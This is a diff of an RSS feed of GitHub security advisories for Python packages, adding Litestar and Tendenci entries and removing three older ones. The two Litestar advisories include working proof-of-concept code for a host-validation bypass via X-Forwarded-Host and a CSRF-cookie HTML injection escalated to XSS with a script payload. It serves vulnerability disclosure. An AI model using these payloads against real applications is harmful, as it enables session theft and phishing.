@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-06-10T18:04:25.497Z</updated>
+    <updated>2026-06-10T19:46:07.647Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,374 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[litestar] Litestar: AllowedHostsMiddleware bypasses host validation via client-controlled X-Forwarded-Host header]]></title>
+        <id>https://github.com/advisories/GHSA-3qmc-cj7q-62hv</id>
+        <link href="https://github.com/advisories/GHSA-3qmc-cj7q-62hv"/>
+        <updated>2026-06-10T19:12:11.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>AllowedHostsMiddleware</code> trusts the <code>X-Forwarded-Host</code> header as a fallback when the <code>Host</code> header is absent. Since <code>X-Forwarded-Host</code> is a client-controllable header, an attacker can bypass the allowed hosts validation by omitting the <code>Host</code> header and supplying an <code>X-Forwarded-Host</code> header set to a whitelisted domain. This enables host header injection attacks such as password reset poisoning, cache poisoning, and server-side request routing manipulation.</p>
+<h3 id="details">Details</h3>
+<p>In <code>AllowedHostsMiddleware.__call__</code>, the host value used for validation is resolved as follows:</p>
+<p><a href="https://github.com/litestar-org/litestar/blob/main/litestar/middleware/allowed_hosts.py#L68">https://github.com/litestar-org/litestar/blob/main/litestar/middleware/allowed_hosts.py#L68</a></p>
+<pre><code class="language-python">headers = MutableScopeHeaders(scope=scope)
+if host := headers.get("host", headers.get("x-forwarded-host", "")).split(":")[0]:
+    if self.allowed_hosts_regex.fullmatch(host):
+        await self.app(scope, receive, send)
+        return
+</code></pre>
+<p>When <code>Host</code> is absent (e.g., HTTP/1.0 clients, misconfigured proxies, or raw TCP connections), the middleware falls back to <code>X-Forwarded-Host</code> without any verification that the request actually passed through a trusted reverse proxy.</p>
+<p>An attacker can send a request with no <code>Host</code> header and set <code>X-Forwarded-Host</code> to any whitelisted domain, bypassing the entire allowed hosts check. The application then processes the request as if it originated from a trusted host.</p>
+<p>This is particularly dangerous when applications use the resolved host value for:</p>
+<ul>
+<li>Generating password reset links (<code>Host</code> header injection → link points to attacker domain)</li>
+<li>Cache key generation (cache poisoning)</li>
+<li>Routing or backend selection decisions</li>
+</ul>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-python">"""
+PoC: Allowed Hosts Bypass via X-Forwarded-Host in Litestar 3.0.0b0
+
+Affected:
+  litestar/middleware/allowed_hosts.py:68
+  -&gt; headers.get("host", headers.get("x-forwarded-host", "")).split(":")[0]
+"""
+
+import asyncio
+from litestar import Litestar, get
+from litestar.config.allowed_hosts import AllowedHostsConfig
+from litestar.testing import TestClient
+
+
+@get("/")
+async def index() -&gt; dict:
+    return {"status": "ok"}
+
+
+app = Litestar(
+    route_handlers=[index],
+    allowed_hosts=AllowedHostsConfig(allowed_hosts=["trusted.example.com"]),
+)
+
+
+# --- 1. Baseline: invalid host is blocked ---
+
+with TestClient(app=app) as c:
+    resp = c.get("/", headers={"host": "evil.com"})
+    assert resp.status_code == 400
+    print(f"[*] Host: evil.com -&gt; {resp.status_code} (blocked)")
+
+
+# --- 2. Bypass: ASGI scope without Host, with X-Forwarded-Host ---
+
+async def test_bypass():
+    scope = {
+        "type": "http",
+        "method": "GET",
+        "path": "/",
+        "root_path": "",
+        "scheme": "http",
+        "query_string": b"",
+        "headers": [
+            # No "host" header — only x-forwarded-host
+            (b"x-forwarded-host", b"trusted.example.com"),
+        ],
+        "server": ("testserver", 80),
+        "app": app,
+        "litestar_app": app,
+        "state": {},
+    }
+
+    captured = {}
+
+    async def receive():
+        return {"type": "http.request", "body": b""}
+
+    async def send(message):
+        if message["type"] == "http.response.start":
+            captured["status"] = message["status"]
+
+    await app(scope, receive, send)
+    return captured["status"]
+
+status = asyncio.run(test_bypass())
+print(f"[*] No Host + X-Forwarded-Host: trusted.example.com -&gt; {status} (bypassed)")
+assert status == 200, f"Expected 200, got {status}"
+print(f"[!] AllowedHosts check passed using client-controlled X-Forwarded-Host")
+</code></pre>
+<p><strong>Output:</strong></p>
+<pre><code>[*] Host: evil.com -&gt; 400 (blocked)
+[*] No Host + X-Forwarded-Host: trusted.example.com -&gt; 200 (bypassed)
+[!] AllowedHosts check passed using client-controlled X-Forwarded-Host
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This is a host validation bypass vulnerability. Any application using <code>AllowedHostsConfig</code> is affected when deployed without a reverse proxy that strips <code>X-Forwarded-Host</code>, or when accepting HTTP/1.0 connections.</p>
+<p>An attacker can bypass the allowed hosts restriction and have requests processed as if they originated from a trusted host. This can lead to:</p>
+<ul>
+<li><strong>Password reset poisoning</strong>: if the application uses the host value to generate reset links, the attacker can redirect them to a malicious domain</li>
+<li><strong>Cache poisoning</strong>: cached responses keyed on the host value can be polluted with attacker-controlled content</li>
+<li><strong>Routing manipulation</strong>: backend routing decisions based on host value can be influenced</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/litestar-org/litestar/security/advisories/GHSA-3qmc-cj7q-62hv">https://github.com/litestar-org/litestar/security/advisories/GHSA-3qmc-cj7q-62hv</a></li>
+<li><a href="https://github.com/litestar-org/litestar/commit/6930a20ceb543912cd651b42deae5b9f3637a262">https://github.com/litestar-org/litestar/commit/6930a20ceb543912cd651b42deae5b9f3637a262</a></li>
+<li><a href="https://github.com/advisories/GHSA-3qmc-cj7q-62hv">https://github.com/advisories/GHSA-3qmc-cj7q-62hv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3qmc-cj7q-62hv</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-10T19:12:10.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[litestar] Litestar has HTML Injection Through its CSRF Token]]></title>
+        <id>https://github.com/advisories/GHSA-542p-wvx7-72m4</id>
+        <link href="https://github.com/advisories/GHSA-542p-wvx7-72m4"/>
+        <updated>2026-06-10T19:12:06.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="overview">Overview</h1>
+<p>Litestar instances which use a template engine in conjunction with CSRF protection are vulnerable to HTML Injection which can be escalated to Cross Site Scripting due to the contents of the CSRF cookie being excluded from automatic escaping by the template engine when configured inline with documentation recommendations.</p>
+<p>We used the latest Litestar version available via PyPI for this disclosure. At the time of writing, that is version 2.21.0 and we have not validated this against the current latest commit on the main branch.</p>
+<h1 id="special-configurations-required">Special Configurations Required</h1>
+<p>For a web application to be vulnerable to this issue, it must:</p>
+<ul>
+<li>Use templates to render the content which is returned to the user (e.g. Jinja, Mako, MiniJinja)</li>
+<li>Have CSRF protection enabled</li>
+<li>Have CSRF inputs enabled (i.e. a hidden form field which contains the CSRF token)</li>
+</ul>
+<p><strong>Links to relevant documentation for the above configurations:</strong></p>
+<ul>
+<li><a href="https://docs.litestar.dev/2/usage/templating.html">https://docs.litestar.dev/2/usage/templating.html</a></li>
+<li><a href="https://docs.litestar.dev/latest/usage/middleware/builtin-middleware.html#csrf">https://docs.litestar.dev/latest/usage/middleware/builtin-middleware.html#csrf</a></li>
+<li><a href="https://docs.litestar.dev/latest/usage/templating.html#adding-csrf-inputs">https://docs.litestar.dev/latest/usage/templating.html#adding-csrf-inputs</a></li>
+</ul>
+<h1 id="reproduction-steps">Reproduction Steps</h1>
+<ol>
+<li>Visit an application which contains a form, uses templating, has CSRF protection enabled, and which inserts the CSRF token as a hidden <code>input</code> field on forms. A proof of concept application demonstrating this configuration is included later in this disclosure for ease of reproduction.</li>
+<li>Observe that the server sets the <code>csrftoken</code> cookie when the page loads.</li>
+</ol>
+<img width="1152" height="372" alt="litestar_csrf_cookie_in_browser_dev_tools" src="https://github.com/user-attachments/assets/252a5746-0f5f-4c78-9b9c-3ff4fb98e942">
+
+<ol start="3">
+<li>Set the value of the <code>csrftoken</code> cookie to <code>"&gt;&lt;h1&gt;HTML Injection Test&lt;/h1&gt;</code>.</li>
+</ol>
+<img width="1142" height="426" alt="litestar_csrf_cookie_poisoned_with_html" src="https://github.com/user-attachments/assets/131e5015-e718-4539-8d03-969e81a34fdc">
+
+<ol start="4">
+<li>Refresh the page.</li>
+<li>Observe that the contents of the cookie is rendered on the page.</li>
+</ol>
+<img width="1152" height="480" alt="litestar_successful_html_injection" src="https://github.com/user-attachments/assets/c997f679-7111-4620-a28d-25eabea34ca2">
+
+<h1 id="exploit-code">Exploit Code</h1>
+<p>There are two Proof-of-Concepts (PoC) included here. The first demonstrates that arbitrary HTML is injected into the page when the user supplies a malicious <code>csrftoken</code> cookie. The second demonstrates how an attacker could deliver an attack using the vulnerability to an unsuspecting user. </p>
+<p>The proof-of-concept applications can be started using these commands:</p>
+<pre><code class="language-bash"># run poc1
+python -m uvicorn poc1:app
+
+# run poc2
+python -m uvicorn poc2:app
+</code></pre>
+<h2 id="poc-1---minimum-vulnerable-application">PoC 1 - Minimum Vulnerable Application</h2>
+<p>This proof-of-concept demonstrates that a crafted <code>csrftoken</code> cookie will be rendered on the vulnerable page as HTML. </p>
+<p><strong>poc1.py</strong></p>
+<pre><code class="language-python">from litestar import Litestar, get, MediaType
+from litestar.response import Template
+from litestar.config.csrf import CSRFConfig
+import jinja2, os
+from pathlib import Path
+from litestar import Litestar
+from litestar.contrib.jinja import JinjaTemplateEngine
+from litestar.template.config import TemplateConfig
+
+@get("/")
+async def hello_world() -&gt; Template:
+    return Template(
+        template_name="test.jinja",
+        media_type=MediaType.HTML,
+    )
+
+ENVIRONMENT = jinja2.Environment(
+    loader=jinja2.FileSystemLoader(
+        searchpath=os.path.join(os.path.dirname(__file__), "templates")
+    ),
+    autoescape=True,
+)
+
+csrf_config = CSRFConfig(secret="my_super_duper_secret")
+
+app = Litestar(
+    route_handlers=[hello_world],
+    template_config=TemplateConfig(
+        directory=Path("templates"),
+        engine=JinjaTemplateEngine.from_environment(ENVIRONMENT),
+    ),
+    csrf_config=csrf_config,
+)
+</code></pre>
+<p><strong>test.jinja</strong></p>
+<pre><code class="language-html">&lt;html&gt;
+    &lt;body&gt;
+        &lt;div&gt;
+            &lt;form method="post"&gt;
+                {{ csrf_input | safe }}
+                &lt;label for="fname"&gt;Username:&lt;/label&gt;&lt;br&gt;
+                &lt;input type="text" id="username" name="username"&gt;&lt;br&gt;
+                &lt;label for="lname"&gt;Password:&lt;/label&gt;&lt;br&gt;
+                &lt;input type="text" id="password" name="password"&gt;
+                &lt;input type="submit"&gt;
+            &lt;/form&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>Sending the following request to the vulnerable page will result in the HTML included in the <code>csrftoken</code> cookie being injected and rendered on the page. </p>
+<pre><code class="language-http">GET /vulnerable HTTP/1.1
+Host: localhost:8000
+Cookie: csrftoken="&gt;&lt;h1&gt;HTML Injection Test&lt;/h1&gt;
+</code></pre>
+<img width="577" height="328" alt="litestar_html_injection_poc_result" src="https://github.com/user-attachments/assets/69590b08-1066-487d-ac37-62f64333de5a">
+
+<h2 id="poc-2---simulated-attack-delivery">PoC 2 - Simulated Attack Delivery</h2>
+<p>This proof-of-concept demonstrates how an attacker could deliver an attack using this vulnerability to an unsuspecting user. We are using this example as it provides for easy local reproduction, it is possible that in end applications there may be various ways to trigger this vulnerability which differ from the example provided. </p>
+<p>First, the user must visit a malicious application (the <code>/first_site</code> endpoint in <code>poc2.py</code>) which sets the <code>csrftoken</code> cookie value to a malicious payload. This app must be hosted on the <em>same top level domain</em> as the vulnerable application so that the poisoned cookie will automatically be sent by the user's browser to the vulnerable page. </p>
+<p>Next, the malicious app <em>redirects</em> the user to the vulnerable app (the <code>/second_site</code> endpoint in <code>poc2.py</code>). The victim's browser will automatically send the poisoned cookie to the vulnerable app. This causes the vulnerable application to unsafely write the cookie content to the page and return it to the user, executing the attack in the victim user's browser</p>
+<p><strong>poc2.py</strong></p>
+<pre><code class="language-python">from litestar import Litestar, get, post, MediaType
+from litestar.response import Template
+from litestar.config.csrf import CSRFConfig
+from litestar.datastructures import Cookie
+import jinja2, os
+from pathlib import Path
+from litestar import Litestar
+from litestar.contrib.jinja import JinjaTemplateEngine
+from litestar.template.config import TemplateConfig
+
+cookie_payload = '"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;'
+
+# malicious site which poisons the csrf cookie
+@get("/first_site", response_cookies=[Cookie(key="csrftoken", value=cookie_payload, httponly=True)])
+async def first_site() -&gt; Template:
+    return Template(
+        template_name="page1.jinja",
+        media_type=MediaType.HTML,
+    )
+
+# vulnerable site
+@get("/second_site")
+async def second_site() -&gt; Template:
+    return Template(
+        template_name="page2.jinja",
+        media_type=MediaType.HTML,
+    )
+
+# example function for form submission if csrf verification succeeds
+@post("/form_receive")
+async def handle_form() -&gt; dict[str, str]:
+    return {
+        "message": "form data received successfully"
+    }
+
+
+ENVIRONMENT = jinja2.Environment(
+    loader=jinja2.FileSystemLoader(
+        searchpath=os.path.join(os.path.dirname(__file__), "templates")
+    ),
+    autoescape=True,
+)
+
+csrf_config = CSRFConfig(secret="my_super_duper_secret")
+
+app = Litestar(
+    route_handlers=[first_site, second_site, handle_form],
+    template_config=TemplateConfig(
+        directory=Path("templates"),
+        engine=JinjaTemplateEngine.from_environment(ENVIRONMENT),
+    ),
+    csrf_config=csrf_config,
+)
+</code></pre>
+<p><strong>page1.jinja</strong></p>
+<pre><code class="language-html">&lt;html&gt;
+    &lt;body&gt;
+        &lt;h1&gt;Setting cookie...&lt;/h1&gt;
+        &lt;script&gt;
+            setTimeout(() =&gt; {
+                window.location.href="/second_site"
+            }, 2000);
+        &lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p><strong>page2.jinja</strong></p>
+<pre><code class="language-html">&lt;html&gt;
+    &lt;body&gt;
+        &lt;div&gt;
+            &lt;form action="/form_receive" method="post"&gt;
+                {{ csrf_input | safe }}
+                &lt;label for="fname"&gt;Username:&lt;/label&gt;&lt;br&gt;
+                &lt;input type="text" id="username" name="username"&gt;&lt;br&gt;
+                &lt;label for="lname"&gt;Password:&lt;/label&gt;&lt;br&gt;
+                &lt;input type="text" id="password" name="password"&gt;
+                &lt;input type="submit"&gt;
+            &lt;/form&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<img width="887" height="223" alt="litestar_poc_first_page_setting_cookie" src="https://github.com/user-attachments/assets/4e8f70e4-fb44-47f6-8e15-42b512cc224f">
+
+<img width="885" height="366" alt="litestar_poc_second_page_xss" src="https://github.com/user-attachments/assets/a8d57c66-0424-483c-ac92-4694d4e08500">
+
+<h1 id="impact">Impact</h1>
+<p>This vulnerability affects all Litestar instances that use templates along with CSRF protection that has been configured inline with the documentation section of "Adding CSRF inputs" within the "Templating" page. An attacker that can successfully exploit this issue can inject arbitrary HTML tags into the page which is then rendered in the victim user's browser. This includes <code>script</code> tags, allowing the attacker to escalate the attack to a Cross Site Scripting attack, thus executing arbitrary JavaScript code in the victim's browser. </p>
+<p>Depending on the configuration of the site, this could result in the theft of cookies or session tokens. This issue can also allow the attacker to change the appearance of the site. This could enable possible phishing attacks by injecting fake forms into the page or even skimming the information that a user enters into a legitimate form. </p>
+<h1 id="resources">Resources</h1>
+<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/79.html">https://cwe.mitre.org/data/definitions/79.html</a></li>
+<li><a href="https://docs.litestar.dev/2/usage/templating.html">https://docs.litestar.dev/2/usage/templating.html</a></li>
+<li><a href="https://docs.litestar.dev/latest/usage/middleware/builtin-middleware.html#csrf">https://docs.litestar.dev/latest/usage/middleware/builtin-middleware.html#csrf</a></li>
+<li><a href="https://docs.litestar.dev/latest/usage/templating.html#adding-csrf-inputs">https://docs.litestar.dev/latest/usage/templating.html#adding-csrf-inputs</a></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/litestar-org/litestar/security/advisories/GHSA-542p-wvx7-72m4">https://github.com/litestar-org/litestar/security/advisories/GHSA-542p-wvx7-72m4</a></li>
+<li><a href="https://docs.litestar.dev/2/release-notes/changelog.html#2.22.0">https://docs.litestar.dev/2/release-notes/changelog.html#2.22.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-542p-wvx7-72m4">https://github.com/advisories/GHSA-542p-wvx7-72m4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-542p-wvx7-72m4</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-10T19:12:05.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[tendenci] Tendenci CMS contains a stored Cross-site Scripting (XSS) vulnerability in the Forums module]]></title>
+        <id>https://github.com/advisories/GHSA-6fvp-wmh6-jg95</id>
+        <link href="https://github.com/advisories/GHSA-6fvp-wmh6-jg95"/>
+        <updated>2026-06-10T18:49:16.000Z</updated>
+        <content type="html"><![CDATA[<p>A stored cross-site scripting (XSS) vulnerability in the Forums module of Tendenci CMS v15.3.7 allows attackers to execute arbitrary web scripts or HTML via injecting a crafted payload.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-70960">https://nvd.nist.gov/vuln/detail/CVE-2025-70960</a></li>
+<li><a href="https://github.com/emirhanyucelll/tendenci/blob/main/Readme.md">https://github.com/emirhanyucelll/tendenci/blob/main/Readme.md</a></li>
+<li><a href="https://github.com/advisories/GHSA-6fvp-wmh6-jg95">https://github.com/advisories/GHSA-6fvp-wmh6-jg95</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-6fvp-wmh6-jg95</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-02-03T00:30:18.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[torch] PyTorch is vulnerable to memory corruption through its torch.lstm_cell function]]></title>
         <id>https://github.com/advisories/GHSA-qfhq-4f3w-5fph</id>
@@ -495,76 +863,5 @@
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2024-05-06T15:30:39.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pywasm3] pywasm3 contains a heap buffer overflow which leads to segmentation fault]]></title>
-        <id>https://github.com/advisories/GHSA-mq9p-qw76-q6h7</id>
-        <link href="https://github.com/advisories/GHSA-mq9p-qw76-q6h7"/>
-        <updated>2026-06-09T19:04:07.000Z</updated>
-        <content type="html"><![CDATA[<p>wasm3 v0.5.0 was discovered to contain a heap buffer overflow which leads to segmentation fault via the function "DeallocateSlot" in wasm3/source/m3_compile.c.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34249">https://nvd.nist.gov/vuln/detail/CVE-2024-34249</a></li>
-<li><a href="https://github.com/wasm3/wasm3/issues/485">https://github.com/wasm3/wasm3/issues/485</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pywasm3/PYSEC-2024-308.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pywasm3/PYSEC-2024-308.yaml</a></li>
-<li><a href="https://github.com/wasm3/pywasm3/blob/main/wasm3/m3_compile.c#L420">https://github.com/wasm3/pywasm3/blob/main/wasm3/m3_compile.c#L420</a></li>
-<li><a href="https://github.com/advisories/GHSA-mq9p-qw76-q6h7">https://github.com/advisories/GHSA-mq9p-qw76-q6h7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-mq9p-qw76-q6h7</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2024-05-06T15:30:39.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[ray] Ray Dashboard is vulnerable to path traversal through its static file handling mechanism]]></title>
-        <id>https://github.com/advisories/GHSA-j3mh-qmjj-xp83</id>
-        <link href="https://github.com/advisories/GHSA-j3mh-qmjj-xp83"/>
-        <updated>2026-06-09T18:36:19.000Z</updated>
-        <content type="html"><![CDATA[<p>A path traversal vulnerability was identified in Ray Dashboard (default port 8265) in Ray versions prior to 2.8.1. Due to improper validation and sanitization of user-supplied paths in the static file handling mechanism, an attacker can use traversal sequences (e.g., ../) to access files outside the intended static directory, resulting in local file disclosure.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32981">https://nvd.nist.gov/vuln/detail/CVE-2026-32981</a></li>
-<li><a href="https://github.com/ray-project/ray">https://github.com/ray-project/ray</a></li>
-<li><a href="https://packetstorm.news/files/id/215801">https://packetstorm.news/files/id/215801</a></li>
-<li><a href="https://www.vulncheck.com/advisories/ray-dashboard-path-traversal-leading-to-local-file-disclosure">https://www.vulncheck.com/advisories/ray-dashboard-path-traversal-leading-to-local-file-disclosure</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/ray/PYSEC-2026-130.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/ray/PYSEC-2026-130.yaml</a></li>
-<li><a href="https://github.com/advisories/GHSA-j3mh-qmjj-xp83">https://github.com/advisories/GHSA-j3mh-qmjj-xp83</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-j3mh-qmjj-xp83</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-17T21:31:45.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pretix] pretix has Email Content Injection Through Maliciously Formatted Names]]></title>
-        <id>https://github.com/advisories/GHSA-2mm6-624x-fqrr</id>
-        <link href="https://github.com/advisories/GHSA-2mm6-624x-fqrr"/>
-        <updated>2026-06-09T16:12:34.000Z</updated>
-        <content type="html"><![CDATA[<p>Emails sent by pretix can utilize placeholders that will be filled with customer data. For example, when {name} is used in an email template, it will be replaced with the buyer's name for the final email. If the name of the attendee contained HTML or Markdown formatting, this was rendered as HTML in the resulting email. This way, a user could inject links or other formatted text through a maliciously formatted name. Since pretix applies a strict allow list approach to allowed HTML tags, this could not be abused for XSS or similarly dangerous attack chains. However, it can be used to manipulate emails in a way that makes user-provided content appear in a trustworthy and credible way, which can be abused for phishing.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-13742">https://nvd.nist.gov/vuln/detail/CVE-2025-13742</a></li>
-<li><a href="https://pretix.eu/about/en/blog/20251126-release-2025-9-1">https://pretix.eu/about/en/blog/20251126-release-2025-9-1</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pretix/PYSEC-2025-154.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pretix/PYSEC-2025-154.yaml</a></li>
-<li><a href="https://pretix.eu/about/en/security">https://pretix.eu/about/en/security</a></li>
-<li><a href="https://web.archive.org/web/20251129201933/https://pretix.eu/about/en/blog/20251127-release-2025-9-2">https://web.archive.org/web/20251129201933/https://pretix.eu/about/en/blog/20251127-release-2025-9-2</a></li>
-<li><a href="https://github.com/advisories/GHSA-2mm6-624x-fqrr">https://github.com/advisories/GHSA-2mm6-624x-fqrr</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-2mm6-624x-fqrr</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2025-11-27T12:30:28.000Z</published>
     </entry>
 </feed>
